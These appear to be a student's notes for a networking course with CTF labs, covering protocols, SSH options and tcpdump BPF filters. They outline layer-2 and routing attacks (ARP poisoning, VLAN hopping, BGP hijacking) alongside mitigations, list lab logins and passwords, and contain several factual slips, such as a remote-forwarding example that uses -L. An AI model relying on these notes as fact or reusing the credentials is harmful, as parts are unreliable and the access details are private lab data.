# Networking
Notes for the Networking Course

http://networking-ctfd-1.server.vta:8000/login
https://net.cybbh.io/public/networking/latest/index.html
https://miro.com/app/board/o9J_klSqCSY=/?share_link_id=16133753693

#START 
=================

#TAGS:
====================================================================================================================================================================================

Network Access:
#header# , #ARP Types# , #Traceroute# #Firewalking# , #SSH#, #SSH Files# , #tcpdump# , #TTL# in ipv4(6) , #TCP DF (Don't Fragment) bit# , #TCP source port# , #Filter for UDP and TCP Packets# ,
#TCP Flags Examples FOR BPFs# , #Wireshark BPFs# , #Specific IP ID# , #P0F Signature Database#, 

Socket Programming:
#Python#, #Python String#, #Python Integer#, #Python Built In Functions# , #Python Built-In Methods#, #Python How Imports Work#, #Network Programming with Python3#, #The socket.socket Function#
#Hex Encoding and Decoding#, #Python Hex Encoding#, #Base64 Encoding and Decoding#, #Python Base64 Encoding#, #Stream Socket Sender Demo#
#Getting a Message to a remote team Utilizing a specific host (BLUE_DMZ_HOST-1) using STREAM SOCKET#
#Getting a Message to a remote team utilizing the specified host (INTERNET_HOST) using DATAGRAM SOCKET#
#Modify ipraw.py #, #modify tcpraw.py#

Network Discovery:
#Passive External Discovery# -  #Ways to Look up DNS information#, 
#Active External Discovery# - #Ping# , #NMAP Defaults#, #NMAP syntax examples# , #Traceroute - Firewalking# , #Netcat - Horizontal Scanning# , #Netcat - Vertical Scanning#
                              #TCP SCAN SCRIPT# , #UDP SCAN SCRIPT# , #BANNER GRABBING# , #CURL and WGET interface with webservers#
#Passive Internal Discovery# - #Packet Sniffers# , #IP Configuration# , #DNS configuration# , #ARP Cache# , #Network connections# , #Services File# , #OS Information# , #Running Processes# , #Command path# , #Routing Table#
                                #File search# , #SSH Config#
#Active Internal Discovery# - #ARP Scanning# , #Ping Scanning# , #DEV TCP Banner Grab# , #DEV TCP Scanning#  , 
#Network Forensics - Mapping#
#CTFs Network Reconnaissance:#

 File Transfer And Redirection
#Trivial File Transfer Protocol# , #File Transfer Protocol# , #File Transfer Protocol Secure# , #Secure File Transfer Protocol# , #Secure Copy Protocol# , #SCP Syntax# , #SCP Syntax w/ alternate SSHD# , #SCP Syntax through a tunnel# , 
#Dynamic Port forward#

SSH Tunneling and Covert Channels
    #6 in 4# ,  #4 to 6# , #Teredo Tunneling# ,   #ISATAP# , #How to Detect Covert Channels# , #Detecting Covert Channels with ICMP# , #Detecting Covert Channels with HTTP#
    #Secure Shell (SSH Tunneling)# ,  #SSH First Connect# , #SSH Re-Connect# , #SSH Host key Changed# , #SSH Key Change Fix# , #SSH Port Forwarding# , 
    #Local Port Forwarding# , #Local Port Forward to localhost of server# , #Local Port Forward to remote target via server# , #Forward through Tunnel# , 
    #Dynamic Port Forwarding# , #SSH Dynamic Port Forwarding 1-Step# ,#SSH Dynamic Port Forwarding 2-Step# , #Remote Port Forwarding# ,  #Remote Port Forwarding from localhost of client# , 
    #Remote Port Forwarding to remote target via client# , #Bridging Local and Remote Port Forwarding#


=================

RED float info : 10.50.26.58 , Your Network Number is 1 (Given by Instructor) , Credentials: net1_studentX:passwordX , X is your student number : ssh net1_student1@10.50.26.58 (password is: password1)
BLUE Float info - ssh student@10.50.30.41 -X (connect through remmina) 
            Command: ssh student@10.50.30.41 -X   (password: password)
            
Red Boundry Router , Hostname: unk, IP: 172.16.120.1, Ports: 22, Username: vyos, Password: password

DAY 1
==================================================================

A 'float' must be used to get to the private net. This 'float' is not inside the network. Once inside the network, you won't be using the float anymore. 
Float info - ssh student@10.50.30.41 -X (connect through remmina)

==================
= Network Access =
==================

Protocol Data Unit:

Session-Application - Data
Transport - Segment/Datagram
Network   - packet
DataLink  - frame
Physical  - bit

Internet Standard Organizations:
IETF - Internet Engineering Task Force; If looking for information on a #header#, look into RFCs (requests for comment).  https://www.ietf.org/standards/
IANA - Internet Assigned Numbers Authority; responsible for global coordination of DNS root, IP addressing, Internet Numbers, etc. They Make the standards for much hardware in use today. https://www.iana.org/
RIR - Regional Internet Registries; 
IEEE - LAN/WAN electrical standards. https://www.ieee.org/

Layer 1: 
Binary (0000100010) - 1 bit, 4 bits (nibble), 8 bits (byte) 16 bits (half word) 32 bits (word)
Decmical - BASE10; regular numeric system.
Hexadecimal - BASE16 (16 symbols). format - 0x42, 0xE3, 0x73, 0xA5, etc. (examples) Single hex character is: 1 nibble. 
Base64 (A-z,a-z,0-9,+,/) format - MTI

LAN  Topologies and Devices:
Bus: All devices connected to a main line through junctions (terminators at the end).
Star: All devices connected to a central hub/switch. All devices talk to eachother but use their individual lines. 
Ring: All devices connected to each other from device-to-device, until all devices are connected in a ring. 
Mesh: All devices directly connected to every device. Partial Mesh: Devices are connected to most devices, if not it's no more than 1-2 hops away.
Wireless: All devices connected to an accept point that touches devices wirelessly. This allows for roaming (moving from one access-point area to another). 
Hierarchical: All devices connect their way op to a core lower of high-end switches. 

Devices:
Hubs - allow multiple nodes to connect on the same wire.
Switches - allows multiple nodes to connect on the network but on their own collision domain. 
Repeaters - extends your connection.
Routers - doesn't care for MAC addresses, but besides this it's a step up from a switch.

Ethernet Timing (Bit-Time):
Speed        Bit-time
10mbs        100ns


LAN Technologies and their benefits and hindrances
Ethernet - 
Wireless -
Token Ring -

Data Link Sub-Layers:
MAC (Media(or medium?) Access Control)
LLC (Logical Link Control)6abd7feac505f1384e6f98e3d1e8ba95

Message Formatting Method and Teminology:
Frames -
Header 
Data 
Footer

Encapsulation and Decapsulation:
In order to pass information between protocl layers, PDUs (protocol data units) must be used, which pass informaiton down layers and back up. 

Switch Operation: 
Building MAC-Address (CAM) Table
  Learns bvy reading Source MAC Addresses
Forwarding Frames
  Decision based on Destination MAC Addresses

Switching Modes
  Cut-through mode
  Fragment-Free
  Store-and-forward

CAM Table Overflow Attack
  Send frames with bogus source MAC address to swtich
  Cause switch to fill table to bogus addresses
  Switch will not be able to learn new (valid) MAC addresses

Describe MAC Addressing
  48 bit length code
Format
  Windows - 01-23-45-12-34-56
  Linux 01:23:45:12:34:56
  Cisco 1234.5612.3456
Parts:
  OUI - the first 24-bits assigned by IANA
  Vendor assigned - last 24-bits assigned by vendor.

MAC Address Types:
  Unicast - one -to - one (unicast bit set to 0) 
  Multicast - sends to multiple (first bit set to 1) 01:00:5e:00:00:00.
  Broadcast - everyone is addressed: FF-FF-FF-FF-FF-FF or FF:FF:FF:FF:FF:FF or ffff.ffff.ffff

MAC Spoofing:


Ethernet Header and Frame:
IPv4 - 0x0800
ARP - 0x0806
IPv6 - 0x86DD
VLAN - 0x8100
Service VLAN tag identifier - 0x88A8
PPP over Ethernet (PPPoE) - 0x8863(4)
MPLS - 0x8847(8)
PROFINET - 0x8892

What is VLAN:
VLAN tag
  MAC Header is a 12-byte field. 6 bytes for Dest MAC and 6 bytes for Src Mac.


VLAN Types
  Default - VLAN 1 
  Data - User Traffic
  Voice - VOIP traffic
  Management - Switch and router management
  Native - Untagged switch and router traffic 

VLAN Hopping Attack
  Switching Spoofing (DTP)
  Single Tagging
  Double Tagging
  SCAPY Example Code

Describe ARP:
  Takes MAC and IP addresses in correspondence with each other.

#ARP Types#
  ARP (OP 1 and 2)
  RARP (OP 3 and 4)
  Proxy ARP (OP 2 )
  Gratuitous ARP (OP 2), think of this as unsolicited. It's not necessary. 

  Operation 1 is a request, and Operation 2 is a reply.
  Operation 3 is a RARP Request, Operation 4 is a RARP Reply. 
  
ARP Cache
  All resolved MAC to IP Resolutions
  If MAC is not in Cache then ARP is used
  Dynamic entries last 12-20 mins. 

MITM with ARP:
  Poison ARP cache with 
    Gratuitious arp
    Proxy arp

Explain VTP with its vulnerabilities:


VLAN Trunking Protocol
  Dynamically add/remove/modify/modify VLANs

VTP 
  Cisco proprietary
  Modes:
    Server
    Client
    Tansparent
    off mode

VTP Vulnerability
  Can cause switches to dump all VLAN information
  Cause a DoS as switch doens't support configured VLANs

Dynamic Trunking Protocl (DTP):
  used to dynamically create trunk links
  Cisco Proprietary
  Is turned on by default
  can send crafted messages to form a VLAN trunk link.
  Recommended to: 
    Disable DTP negotiations
      Manually assign as Access or Trunk

  CDP, FCP and LLDP
    Cisco Discvory Protocol
    Foundry Discovery Protocol
    Link Layer Discovery Protocol

      These: 
        Leak Valuable information, in clear text. 
        Enable by default.
        Disable this: globally, per interface. 
      These may be required for VOIP.

Explain Spanning Tree Protocol: 
  Spanning Tree Protocl (STP)
    It figures out the best route to a destination and then only used that one. 
    It asks every switch for their root switch and designated ports so it knows what not to use. 
    R is a port it uses to get to the root.
    D is a designated port that must be open. 

    1. Elect root Bridge
    2. ID the root ports on non-root bridge
    3. ID the designated port for each segment. 

  STP Types
    802.1D STP
    802.1w - Rapid Spanning Tree Protocol (RSTP)
    Rapid Per VLAN Spanning Tree (Rapid PVST)

  Spanning Tree attack
    Crafted bridge protocl data units. (BDPUs)

  Port Security
    Shutdown (default) - shut down a port, sends an SNMP trap notification.
    Protect - will drop any frames from unkown source addresses.
    Restrict - it will keep the port up, but this option will log it.

  Layer 2 attack mitigation techniques:
    Shutdown unused ports
    Enable port security
    IP source guard
    Manually assign STP Root
    BPDU Guard
    DHCP Snooping
  
  other techniques:
    802.1x - a client based authentication
    Dynamic ARP inspection (DAI)
    Static CAM entries (not recommended)
    Stat ARP entries
    Disable DTP negotiations
    Manually assign Access/Trunk Ports
    

====================
= Network Layer FG =
====================

IP versions
  IPv4 (ARPANET 1982)
    Classful subnetting
    classless subnetting
    NAT
  Ipv6
  
Describe Classful IPv4 Addressing and Subnetting
  Class A (0 - 127)
  Class B 
  etc.

Subnetting


Analyzing IPv4 Packet Header
  Version  Internet-Header-Length  Differentiated-Service-Code-Point  Explicit-Congestion-Notification  Total-Length  Identification  Flags  Fragment-Offset  

  
  Time-to-Live  Protocol  Header-Checksum  Src.Address  Dest.Address   Options
  

IPv4 Address Types
  Unicast
  ...

IPv4 Address Scopes
  Public
  Private (RFC1918)
  Loopback (127.0.0.0/8)
  Link-Local (APIPA) - automatically assigns an IP address to a newly registered device. 
  Multicast (class D)

IPv4 Fragmentation
  Breaks up packets from a higher MTU to a lower MTU.

Fragmentation Process
  Teardrop Attack - takes advantage of the fragmentation process. 

IPv6 Fragmentation
  does not support fragmentation within it's header.
  Routers do not fragmetn IPv6 packets
  Source adjusts MTU to avoid fragmentation
  Source can use IPv6 fragmentation extension header. 

Fragmentation Vulnerability

OS Fingerprinting with TTL
  Vendors have chosen different values for TTL which can provide insight to which OS family a generated packet is from. 

IPv4 Auto Configuration 
  APIPA
    169.254.0.0/16
    RFC 3927
  DHCP
    DORA Process
    RFC 1531

IPv4 Auto Config Vulnerability
  Rogue DHCP Server
  Evil Twin
  DHCP Starvation

Analyze ICMPv4 Protocol and Header Structure
  ICMP is more of a management protocol.
  Type 8 - echo request
  Type 0 - echo reply
  Type 3 - Destination Unreachable
  etc.

ICMPv4 OS Fingerprinting
  Linux   
    Default size is 64-bytes
    payload message: 
    ...

  Windows
    Default size is 48-bytes
    payload message:


  ICMPv4 Traceroute
    #Traceroute#
    #Firewalking#
traceroute 8.8.8.8
sudo traceroute 8.8.8.8 -T
sudo traceroute 8.8.8.8 -T -p 443
sudo traceroute 8.8.8.8 -U -p 123 
sudo traceroute 8.8.8.8 -I

  SMURF Attack
    Cracks a custom ICMP message.
    Takes advantage of broadcasting. 

  IPunreachable messages to map a network

  ICMP Cover Channel


Explain IPv6 Addressing
  128 bits long
  Same fields
    Fields no longer here: optons, padding, IHL, identification, Flags, Fragment Offset, Header Checksum. 
    New field: Flow label.
    
IPv6 Representation
    2001:0db8:85a3:0000:0000:8a2e:0370:7334,

Identify IPv6 Address Types:
  Type 128 - request
  Type 129 - reply
  Type 134 - Router Advertisement
  Type 136 - Neighbor Advertisement
  
Ipv6 Address Scopes

Ipv6 Zero Configuration (link-local)
  

Vulnerabilities;
  SLAAC MITM

ICMP also supports ICMPv6

Explain Neighbor Discovery Protocol (NDP)
 Router Solicitation 
 ...

Discuss Routing:
  How does a router know where to send a packet when it arrives? It looks at it's routing table. 
  The routing table is just a list of networks to which the packet can be fwded to. 
  
Think back to JCAC. The Enterprise Level Networking Mod provided a lot of examples of routing tables. These same tables are where we'll get all of our routing information from for a given network. 

Administrator Distance:
  Connected 0
  Static 1
  EIGRP 5
  External BGP 20
  Internal EIGRP 90
  IGPR 100
  OSPF 110
  IS-IS 115
  etc.

Lookup Process:

Metrics: 
  RIP - Hop
  EIGPR - Bandwidth, Delay, Load, Reliability
  OSPF - Cost
  BGP - Policy

Dynamic Routing Protocols
  Classful                          vs.      Classless
  -Doesn't carry
  subnet mask info within 
  the routing updates.
  -Exchange routing updates at
  Regular Time Intervals.
  -Use periodic updates
  -Do not use Hello messages
  -Consumes more network
    bandwidth.
  -Does not support CIDR and VLSM

Classless is newer. 

  Routed vs Routing Protocols
  
IGP and EGP 
 Interior Gateway Protocol - only functions within its AS (a number designated to your network).
 Exterior Gateway Protocol - used to exchange routing information between autonomous systems. 

BGP
 Border Gateway Protocol - the only currently viable EGP and is the official routing protocol used by the internet. 

AS
 Autonomous System - Collection of connected internet protocol routing prefixes unther the control of one or more network operators on behalf of a single administrative entity or domain, that presents a common and clearly defined routing  policy to the internet. 
 Usually these ASs are regionally based, and these regions are assigned by IANA. 

Autonomous systems are 16-bit or 32-bit: 
AS109   CISCO-EU-109 Cisco Systems Global ASN
AS193   FORD-ASN - Lockheed Martin Western Development Labs
AS721   DoD Network Information Center Network
AS3598  MICROSOFT-CORP-AS - Microsoft Corporation
AS15169 GOOGLE - Google Inc.

Distance Vector Routing Protocols: 

  
Link State Routing Protocol:
  Builds its own tree, which is then broadcasted out and all devices wil then use the broadcasted route. 

Distance Vector vs Link State:


Routing Protocol Vulnerabilities:
  DDOS
  PMA - Packet Mistreating Attack
  RTP - Routing Table Poisoning
  HAR - 
  PA

BGP
  again, this is the road-map of the internet.
  Routes traffic between AS numbers.
  Advertises IP CIDR Address blocks. 
  Establishes peer relationships. 

BGP Operation
  How it chooses the best path:
    Advertises a more specific route. 
    Offers a shorter route

BGP Hijacking
  Illegitimate advertising of Addresses
  BGP Propogates false informaiton
  Purpose:
    Stealing prefixes
    monitoring traffic
    intercept internet traffic
    'black hoking' traffic
    perform MitM

BGP Hijacking Defense
  IP prefix filtering
  BGP Hijacking detection
    tracking the change in TTL of incoming packets
    increased roung tip time (RTT) which increases latency.
    Monitoring misdirected traffic
  BGPSec

Dynamic vs. Static Routing
  Dynamic is often preferred because it is easy. Static won't send updates (burn bandwidth) and it's data path is pre-determined. However, it's also time-consuming, prone to error, must have its problems resolved by an admin, and does      not scale well for large network growth. 

  Dynamic Routing is easy to configure and maintain, no intervention needed for network outages and scales well for large networks. However, it consumes a lot of badnwidth and resources, updates can be intercepted and data-path is NOT      predetermined. 

First Hop Redundancy Protocol
  HSRP - provides default gateway redundancy using one active and one stadby router.
  VRRP - Open standard alternative to Cisco's HSRP, providing the same functionality.
  GLBP - Supports arbitrary load balancing in addition to redundancy across gateways; cisco proprietary. 

FHRP Attack
  Intercept the FHRP message exchange
  Inject manipulated messages
  MitM by becoming the active forwarder.

============================
= Transport to Application =
============================

Transport Layer Protocols
  Connection-oriented
    TCP - Segments
    Unicast Traffic
  Connetion-less
    UDP - Datagrams
    Broadcast, Multicast, or unicast traffic.

Port Ranges
  0 - 1023 Well-known (system)
  1024 - 49151 Registered (User)
  49152 - 65535 Dynamic (Private)

TCP Reliability
  1 Connection Establishment
    3-way handshake
  2 Data Txfer
    Extablished phase
  3 Connection Termination
    4-way termination

TCP Headers

TCP States

TCP Options


UDP Headers
  Cares about the source, destination and how big the packet is. 
  (Fire and Forget)

Virtual Private Networks (VPN)
  Connects through a network that is not accessible to everyone else. This "private" connection makes it look like it is a direct connection when it is in fact NOT.   
  Types:
    Remote Access (Client-to-Client)
    Site-to-Site (Router-to-Router)

L2TP
  Layer 2 Tunneling protocol. Everything is clear-text visible with this. 

PPTP
  Some encryption, but mostly obsolete.
    
IPSec 
  Most popular suite of protocols used today because it DOES provide encryption.
  Transport mode: only encrypts the payload   
  Tunnel mode: used for end to end communication between two hosts or devices.
  
OpenVPN
  
Proxies 
  A vital intermediary that stands between a user's device, either a computer or smartphone, and the vast expanse of the internet. It acts as a sophisticated gateway. 
  They are instrumental guardians of privacy, gatekeepers for access control and enchangers of overall inernet efficiency. 

SOCKS 4/5 (TCP 1080)
  Socket Secure, is a protocol that facilitates communication between clients and servers through a proxy server. 

SOCKS 4
  No authentication
  only IPv4
  No UDP Support
  No Proxy binding. CLient's IP is not relayed to destination. 
SOCKS 5
  Better than SOCKS 4

Network Basic Input Output System Protocol
  TCP 139 and UDP 138

RPC (any port)
  Allows a program to execute a request on a local/remote computer
  Hides network complexities

API   
  A Framework of rules and protocols for software components to interact
  Methods, parameters, and data formats for requests and responses.
    REST and SOAP

Presentation Layer
  Translation and transformation

Telnet (TCP 23)
  Remote login
  Authentication
  Clear Text
  Credentials susceptible to interception

SSH (TCP 22)
  Messages provided:
    Client/Server Authentication
    Asymmetric or PKI for key exchange
    Symmetric for session
    User authentication
    Data Stream Channeling

Components of SSH Architecture
  Client/Server/Session
    Keys
      User Key
      Host Key 
      Session Key

SSH Implementation Concerns
  Using password authentication only
  Key rotation
  key management
  implementation specification (libssh, sshtrangerthings)

SSH Usage
#SSH#
$ ssh {user}@{ip}
$ ssh student@172.16.82.106


-X = This will enable X11 graphics to be forwarded from the server to the client. This will allow you to open graphical applications such as pcmanfm, gimp, eog, eom, firefox, terminator, and more. ssh student@172.16.82.106 -X
    This option will allow you to view images.  
-v = Enables verbose mode, which provides detailed debugging information about the SSH connection process. This can be helpful for diagnosing connection issues or troubleshooting SSH configuration problems. ssh student@172.16.82.106 -v

-f = Requests SSH to go to the background just before command execution. This is useful when running SSH commands as part of scripts or automation tasks. This is not to be confused with the & option which is used to background most applications. ssh student@172.16.82.106 -f

-i {identity file} = Selects a file from which the identity (private key) for RSA or DSA authentication is read. The default is ~/.ssh/identity for protocol version 1, and ~/.ssh/id_rsa and ~/.ssh/id_dsa for protocol version 2. ssh student@172.16.82.106 -i idfile.pub

-F {config file} = Specifies an alternative per-user configuration file. If a configuration file is given on the command line, the system-wide configuration file (/etc/ssh/ssh_config) will be ignored. The default for the per-user configuration file is ~/.ssh/config. ssh student@172.16.82.106 -F my.config

-N = Requests that no command be executed on the remote server after establishing the SSH connection. This can be useful when setting up port forwarding or establishing a tunnel without running a command on the remote server. ssh student@172.16.82.106 -NT

-T = Disables pseudo-terminal allocation, preventing the allocation of a terminal on the remote server. This can be useful when executing commands that do not require interaction or terminal emulation. ssh student@172.16.82.106 -NT

-C = Enables compression of data during transmission over the SSH connection, reducing bandwidth usage, especially over slow or high-latency connections. ssh student@172.16.82.106 -C

-J user@host = Specifies a jump host to connect through when establishing the SSH connection. This simplifies the process of connecting to a remote host that is not directly accessible from the local machine. ssh -J student@10.10.0.40, student@172.16.1.15, student@172.16.40.10 student@172.16.82.106

-L [bind_address:]port:host:hostport = Sets up local port forwarding, allowing connections to a local port to be forwarded over the SSH tunnel to a specified host and port on the remote server. This can be useful for accessing services running on a remote server through a secure tunnel. ssh student@172.16.82.106 -L 1234:192.168.1.10:22

-R [bind_address:]port:host:hostport = Sets up remote port forwarding, allowing connections to a specified port on the remote server to be forwarded over the SSH tunnel to a host and port on the local machine or another remote server. This can be useful for exposing services running on the local machine to the remote server or other remote machines. ssh student@10.10.0.40 -L 1234:172.16.40.10:22

-D {port} = Specifies a local "dynamic" port forwarding port. This creates a SOCKS proxy on the specified port, allowing other applications to tunnel their traffic through the SSH connection securely. ssh student@172.16.1.15 -D 9050

Expect a warning when initially connecting through SSH.
  Warns that the Host Key Changed (you connected to somebody else this session than you did during your last session).
  This could be a warning if you noticed you're getting this message but you hadn't connected to any different users since the last time you SSHd.

#SSH Files# , SSH Configuration Files
  cat .ssh/known_hosts
      /etc/ssh/ssh_config
      /etc/ssh/sshd_config

View/Change SSh Port
  To view current configured SSH Port 
    cat /etc/ssh/sshd_config | grep Port
  To edit file to change the SSH Port
    sudo nano /etc/ssh/sshd_config

  SSH-KeyGen
    ssh-keygen -t rsa -b 4096 -C "Student"

  SH-Copy-ID
    ssh-copy-id student@172.16.82.106

HTTP(S) (TCP 80/443)
  User Request Methods
    Get/HEAD/POST/PUT
  Server Response Codes 
  100,200,300,400,500
  Vulnerabilities
    Flooding
    Amplification - makes the attack appear as if it is originating from multiple sources.
    Low and slow - functions by opening connections to a targeted web-server and then keeping those connections open as long as it can. 
    Drive-by Downloads - 
    BeEF Framework

DNS (TCP/UDP 53)
  DNS Query / Response
    Resolves Names to IP Addresses
    Queries and responses use UDP
    DNS response larger than 512 bytes
      DNS Zone transfer

  DNS Records
  A - Ipv4
  AAAA - IPv6
  MX - Mail Server Record
  TXT - Human-readable text
  NS - Name Server Record
  SOa - Start of Authority

  Architecture
    Root Domain
    Tol-Level Domain : .com .org .net .gov
    Second-Level Domain : .att .google .lana .wikipedia
    Third-Level Domain : www drive mail 

FTP (TCP 20/21)
  RFC 959
  Port 21 open for Control
  Port 20 only open during data transfer
  Authentication or anonymous
  Clear text
  Modes: 
    Active (default)
    Passive

  FTP Active
    Client initiates the connection with a server on port 21 from the client's ephemeral high port. 
    3-Way Handshake 
  FTP Active Issues
    NAT and Firewall Traversal issues
    Complications with tunneling
  
  FTP Passive
    Passive FTP sidesteps the issue of Active mode by reversing the conversation. Client initiates both the command and the data connections. 

TFTP (UDP 69)
  Clear text
  Reliability provided at Application layer
  Used by routers and switches to transfer IOS and config files

SMTP (TCP 25)
  Used to send email
  No encryption
  SMTP over...

POP (TCP 110)

IMAP (TCP 143)

DHCP (UDP 67/68)
  How you get an IP address if you don't have one.

DHCPv4
  DORA

DHCPv6
  SLAAC

NTP (UDP 123)
   Stratum 0 - authoritative time source
     Up to stratum 15
     Vulnerable to crafted packet injection
     Can break time sensitive applications.

AAA Protocols
  Authentication, Authorization, Accounting
  For Third party authentication

    TACACS (TCP 49) Simple/Extended
      It's a network security protocol used for centralized authentication, authorization and accounting services in network devices such as routers, switches and firewall.

  RADIUS (UDP 1645/1646 and 1812/1813)

  Analyze Diamaeter Protocol (TCP 3868)

  SNMP (UDP 161/162)
    7 Message Types:
      Get Request
      Set Request
      Get Next
      Get Bulk
      Response
      Trap
      Inform
    Vulnerabilities: 
      Weak community string
      Lack of encryption
      Information disclosure

RTP (UDP any above 1023)

RDP (TCP 3389)
  Developed by Microsoft (open standard)
  No server software needed

KERBEROS (UDP 88)
  Issues out tickets. 
  Secure network authentication protocol.
  Clients obtain tickets to access services.
  mutual athentication.
  used by active directory. 

LDAP (TCP 389 and 636)
  Client/server model
  Higherarchical
  Directory Schema
  Unsecure and secure versions







==================================
=========     Day 2    ===========
==================================







Sniffing Tools and Methods
  Practical Uses
    Network troubleshooting
    diagnosing improper routing or switching
    identifying port/protocol misconfigurations
    monitoring networking consumption
    intercepting usernames and passwords
    eavesdrop on network communications.
  Disadvantages:
    Requires elevated permissions
    Can only capture what the NIC can see
    Cannot capture local traffic
    can consume massive amounts of system resources
    lost packets on busy networks
  Packets can be captured by:
    Hardware packet sniffers
    Software Packet sniffers

Describe Socket Types
  User Space Sockets
    Stream socket - TCP
    Datagram socket - UDP
  Kernel Space Sockets
    RAW Sockets

Capture library 
  Requires root for:
    promiscious mode (listens on all NICs)
    All captured packets are created as RAW sockets

Types of Sniffing
  Active
  Passive

Popular Software Packet Capture Programs
  tcpdump, tshark, NetworkMiner, SolarWinds, EtterCap
  Wireshark, p0f, NetMiner, BetterCap

  other:
  Kismet, McAfee, Nmap, Snort, L0phCrack, ngrep, Scapy
  Suricata

Interface Naming
  Traditional: 
    eth0, eth1
  Consistent:
    eno1, ens3

Explain TCPDUMP Primitives #tcpdump#
  User Friendly capture expressions:
    src or dst
    host or net
    tcp or udp

basic tcpdump options:
  -A = print payload in ASCII
  -D = list interfaces
  -i = specify capture interfaces
  -e = print data-link headers
  -X or XX = print payload in HEX and ASCII
  -w = write to pcap
  -r = read from pcap
  -v, vv, or vvv = verbosity
  -n = no inverse lookups

TCPdump primitve qualifier:
  type- the 'kind of thing' that the id name or nubmer refers to:
    host, net, port, or portrange.
  dir - transfer direction to and/or from.
    src or dst
  proto- restricts the match to a particular protocol
    ether, arp, ip, ip6, icmp, tcp, or udp. 

Logical operators:
  Primitives can be combined using: 
    'and' (&&)
    'or' ( || )
    'not' (!)
Relational Operators
  < or <=
  > or >=
 = or == or !=

tcpdump primitive examples:
  simple
  extended

examples: sudo tcpdump -i eth0 arp
          or
          sudo tcpdump -i eth0 icmp
          sudo tcpdump -VVn-i eth0 icmp
          sudo tcpdump -vvn -i eth 0 icmp host 10.10.0.40
          sudo tcpdump -vvn -i eth 0 icmp dst host 10.10.0.40 or sudo tcpdump -vvn -i eth 0 icmp src host 10.10.0.40
          sudo tcpdump -vvn -i eth 0 icmp src host 10.10.0.0/24
          sudo tcpdump -vvn -i eth 0 icmp port 22
          sudo tcpdump host 192.168.1.1 and \( 1.1.1.1 or 10.1.1.2\) or sudo tcpdump host 192.168.1.1 and '1.1.1.1 or 10.1.1.2'

if having problems with tcpdump, you can enter debug mode. 
  ex. tcpdump "ether[12:2] = 0x800" -d 

  -d = Dump the compiled packet-matching code in human readable form. 
  lhd - loads half-word value in the accumulator from offset 12 in the ethernet header.
  jeq - check if the value is "0x800" and if this is true "jump true" to line if it is false "jump false" to line 3.

  
Construct a BPF #BPF# this is great for filtering out as much as possible and can make your job up to x20 quicker.
  tcpdump requests a RAW socket creation
  Filters are set using the SO_Attach_Filter
  So_Attach_Filter allows us to attach a Berkley Packet Filter to the socket to capture incoming packets. 

BPF examples:
  tcpdump -i eth0 'ether[12:2] = 0x0806'
  tcmpdump -e eth1 'ip[9] = 0x06'
  tcmpdump -i eth0 'tcp[0:2] =53 || tcp [2:2] = 53'
  tcpdump 'ether[12:2] 0x0800 && (tcp[2:2] != 22 && tcp[2:2] != 23)'
  [ :2] read 2 bytes
  [ :4] reads 4 bytes
  [ : ] reads 1 byte by default

  Bitwise masking examples
    tcpdump 'ether 'ether[12:2] = 0x0806'
    tcpdump ip[1] & 252 = 32' (filters for DSCP information, all DSCP value is between 32 and 4. (a 4 is a 1 for DSCP))
    tcpdump 'ip[6] & 224 = 32' 
    tcpdump 'tcp[13] & 0x11 = 0x11'
    tcpdump 'tcp[12] & 0xf0 > 0x50' (filters for byte 12, and the for bits turned on within the offset value only ( 0xf0) that are greater than 0x50. 
  
Filter logic most exclusive:
  tcp[13] & 0x11 = 0x11
Least exclusive:
  tcp[13] & 0x11 > 0
  tcp[13] & 0x11 !=0

BPFS at the Data-Link Layer
  Searching for the destination broadcast MAC address.
    'ether[0:4] = 0xffffffff && ether[4:2] = 0xffff'
    'ether[0:2] = 0xffff && ether[2:2]= 0xffff && ether[4:2] = 0xffff'

  Searching for the source MAC address.
    'ether[6:4] = 0xfa163ef0 && ether[10:2] = 0xcafc'
    'ether[6:2] = 0xfa16 && ether[8:2] = 0x3ef0 && ether[10:2] = 0xcafc'

BPFS at the Data-Link Layer
  'ether[0] & 0x01 = 0x00'
  'ether[0] & 0x01 = 0x01'
  'ether[6] & 0x01 = 0x00'
  'ether[6] & 0x01 = 0x01'

Search for IPv4, ARP, VLAN Tag, and IPv6 (respectively)
  ether[12:2] = 0x0800
  ether[12:2] = 0x0806
  ether[12:2] = 0x8100
  ether[12:2] = 0x86dd

Searching for 802.1Q VLAN 100
  'ether[12:2] = 0x8100 && ether[14:2] & 0x0fff = 0x0064'
  'ether[12:4] & 0xffff0fff = 0x81000064'
  
Search for double VLAN tag
  'ether[12:2] = 0x8100 && ether[16:2] = 0x8100'

BFPS at the Network Layer
  Search for IHL greater than 5
    'ip[0] & 0x0f > 0x05'
    'ip[0] & 15 > 5'

Search for ipv4 DSCP value of 16
  'ip[1] & 0xfc = 0x40'
  'ip[1] & 252 = 64'
  'ip[1] >> 2 = 16' (>> means drop two bytes from the right, meaning the start point moves further to the left (by 2))

Search for traffic class in ipv6 having a value
  'ip6[0:2] & 0x0ff0 != 0'

Search only for the RES flag set. DF and MF must be off. 
  'ip[6] & 0xE0 = 0x80'
  'ip[6] & 224 = 128'

Search for RES bit set. The other 2 flags are ignored so they can be on or off. 
  'ip[6] & 0x80 = 0x80'
  'ip[6] & 128 = 128'

Search for ONLY the DF flag set. RES and MF must be off.
  'ip[6] & 0xE0 = 0x40'
  'ip[6] & 224 = 64'

Search for #TCP DF (Don't Fragment) bit# set. The other 2 flags are ignored so they can be on or off.
  'ip[6] & 0x40 = 0x40'
  'ip[6] & 64 = 64'
  example:
    'ip[6] & 64 != 0' (this will filter for all IPv4 packets with at least the Dont Fragment bit set)
    sudo tcpdump -n "ip[6] & 64 != 0" -r /home/activity_resources/pcaps/BPFCheck.pcap | wc -l
    
Search for ONLY the MF flag set. RES and DF must be off.
  'ip[6] & 0xe0 = 0x20'
  'ip[6] & 224 = 32'

Search for MF bit set. The other 2 flags are ignored so they can be on or off.
  'ip[6] & 0x20 = 0x20'
  'ip[6] & 32 = 32'

Search for offset field having any value greater than zero (0).
  'ip[6:2] & 0x1fff > 0'
  'ip[6:2] & 8191 > 0'

Search for MF set or offset field having any value greater than zero (0).
  'ip[6] & 0x20 = 0x20 || ip[6:2] & 0x1fff > 0'
  'ip[6] & 32 = 32 || ip[6:2] & 8191 > 0'

 Search for #TTL# in ipv4(6) packet.
  'ip[8] = 128'
  'ip[8] < 128'
  'ip[8] >= 128'
  'ip6[7] = 128'
  'ip6[7] < 128'
  'ip6[7] >= 128'
  example syntax:
  "ip[8]<65||ip6[7]<65" ( this will search for ip and ipv6 packets with a ttl of 64 and less)
  sudo tcpdump -n "ip[8] < 65 or ip6[7] < 65" -r /home/activity_resources/pcaps/BPFCheck.pcap | wc -l
